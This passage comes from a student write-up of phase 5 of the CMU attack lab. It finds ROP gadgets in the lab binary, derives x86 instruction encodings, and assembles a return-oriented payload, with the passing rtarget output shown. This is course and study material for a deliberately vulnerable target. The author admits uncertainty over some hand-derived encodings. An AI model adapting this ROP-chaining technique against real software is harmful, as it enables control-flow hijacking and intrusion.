movq    %rsp, %rsi => 48 89 e6
movq    %rsp, %rdi => 48 89 e7 --> ideal solution
```

Searching the farm using the same method as phase 4 yields the following results:
```
%rsp -> %rax:   - 401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
                  401a09:	c3                   	retq
                - 401aab:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
                  401ab1:	c3                   	retq

%rsp -> %rcx:   no solution
%rsp -> %rdx:   no solution
%rsp -> %rbx:   no solution
%rsp -> %rbp:   no solution
%rsp -> %rsi:   no solution
%rsp -> %rdi:   no solution
```

It looks like we'll have to use %rax as the in-between register again and we have 2 options available for doing that.

The next step is moving the address from %rax into %rdi. A direct solution would be movq %rax, %rdi = 48 89 c7.
For this, we can use our gadget from phase 4 at 0x4019a2.

There is a problem with this solution. %rsp always holds the address of the next instruction on the stack. Once we copy the value from %rsp into %rax, the next instruction on the stack must be the next gadget, so after the value is moved from %rax into %rdi, the argument for touch 3 would be the address of our gadget 2.

Instead, we need some way of incrementing or decrementing the address in %rsp before moving it to %rdi. We could look for gadgets that would increment %rsp before we move it into %rax, but that would again mess up our stack. A convenient place to modify the value would be while it's in %rax but before we move it to %rdi.

We need an instruction that adds or subtracts some constant to %rax. Since we will have to manually place the cookie at the specified address, we ideally don't want to move it too much, so it's also possible to add/sub to lower bits of %rax. So we can also use %eax, %ax and %al.

It looks like any instruction for add %eax, const is encoded starting with 05 [bibliography reference 12], But there is no such instructions in the farm. 

Following this guide: [bibliography reference 13], I'm going to try to find out what are the general encodings for adding to rax, eax, ax and al.

Example for finding out the instruction for %rax:
```
add_rax.s:
    add %rax, 0xff

$ as add_rax.s -o add_rax.o

$ objdump -d add_rax.o

add_rax.o:     file format elf64-x86-64

disassembly:
    0000000000000000 <.text>:
        0:   48 01 04 25 ff 00 00    add    %rax,0xff
        7:   00
```

With this process I get the following machine code:
```
add %rax, const: 48 01 04 25 const...
add %eax, const:    01 04 25 const...
add %ax, const:  66 01 04 25 const...
add %al, const:        04 25 const...
```

There is no code in the farm that would support any of these, but looking into it further, it looks like the 0x25 byte is not necessary in x86 encodings for add [bibliography reference 14] 0x05 is also not in the farm, but there is one instance of addition to %al, encoded simply by 04:
```
4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
4019da:	c3                   	retq
```

the 04 37 c3 should be equivalent to add %al, 0x37 -> ret. This is part of Johnny Kong's solution [bibliography reference 11] and I think a better understanding of how the encodings of different operations are created is necessary to reliably find a solution like this. I'm not sure what the reason is that my attempt at add %al, const compiled as 04 25 const..., when 04 const... works as well.

Finally we need a gadget to move our cookie from %rax to %rdi. We can use the same gadget as phase4 for this.

Since we're adding 0x37(55 bytes) to %rax, our cookie has to start exactly 55 bytes after the first gadget (rounded up to 8 bytes).

Therefore, our solution will be:
```
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
AD 1A 40 00 00 00 00 00 --> movq %rsp, %rax
D8 19 40 00 00 00 00 00 --> add %al, 0x37
C5 19 40 00 00 00 00 00 --> movq %rax, %rdi
FA 18 40 00 00 00 00 00 --> call touch3
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 35 --> padding and the start of our string-cookie
39 62 39 39 37 66 61 00 --> the rest of our cookie string
```

Using hex2raw to feed our raw input into rtarget:
```
$ cat phase5_answer | ./hex2raw | ./rtarget -q
    Cookie: 0x59b997fa
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target rtarget
    PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            AD 1A 40 00 00 00 00 00
            D8 19 40 00 00 00 00 00
            C5 19 40 00 00 00 00 00
            FA 18 40 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 35
            39 62 39 39 37 66 61 00
```

[Back to Top](./labs#highlighted-labs-for-computer-systems)


# Bibliography
0. How movzbl works: https://stackoverflow.com/questions/13881907/what-is-this-movsbl-instruction

1. State of %eax after strings_not_equal: https://stackoverflow.com/questions/13064809/the-point-of-test-eax-eax

2. How unsigned comparison works in machine code: http://vitaly_filatov.tripod.com/ng/asm/asm_000.36.html

3. How movslq works: https://stackoverflow.com/questions/55584797/what-does-movslq-do

4. strtol: https://www.tutorialspoint.com/c_standard_library/c_function_strtol.html

5. Suggestion to bruteforce fun7: https://cs.bennington.college/courses/fall2020/systems/code/homework/bomblab/jims_answers

6. Hint on how to check if a number is larger/smaller than a different number: https://cs.bennington.college/courses/fall2020/systems/code/homework/datalab/bits.c?html

7. Using xor for bit parity: https://github.com/cantora/cs2400-datalab/blob/master/bits.c

8. Solution for floatInt2Float: https://cs.bennington.college/courses/fall2020/systems/code/homework/datalab/bits.c?html

9. Solution for floatFloat2Int: https://cs.bennington.college/courses/fall2020/systems/code/homework/datalab/bits.c?html

10. Writeup provided with the attack lab: http://csapp.cs.cmu.edu/3e/attacklab.pdf

11. Johnny Kong's solution to Attack lab: https://github.com/JonnyKong/CMU-15-213-Intro-to-Computer-Systems/blob/master/LAB3_attacklab/README.md

12. Encodings of x86_64 instructions: https://pyokagan.name/blog/2019-09-20-x86encoding

13. Guide for finding x86_64 instruction encodings: https://www.systutorials.com/beginners-guide-x86-64-instruction-encoding/

14. Actual encodings of machine instructions: https://c9x.me/x86/html/file_module_x86_id_5.html 
